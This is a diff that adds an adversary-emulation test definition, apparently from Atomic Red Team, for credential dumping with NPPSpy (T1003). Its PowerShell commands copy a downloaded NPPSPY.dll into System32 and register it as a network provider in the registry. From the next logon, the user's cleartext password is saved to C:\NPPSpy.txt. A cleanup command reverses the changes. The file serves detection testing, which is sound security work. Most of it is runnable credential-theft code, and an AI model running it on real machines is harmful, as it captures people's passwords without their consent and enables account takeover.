@@ -1,0 +1,32 @@
+{
+    "name": "Credential Dumping with NPPSpy",
+    "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy. After user's logging in cleartext password is saved in C:\\NPPSpy.txt. Clean up deletes the files and reverses Registry changes. NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"",
+        "cleanup_command": "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "OS Credential Dumping",
+    "source": "ART",
+    "uuid": "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "NPPSpy.dll must be available in ExternalPayloads directory",
+            "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\") {exit 0} else {exit 1}",
+            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\""
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
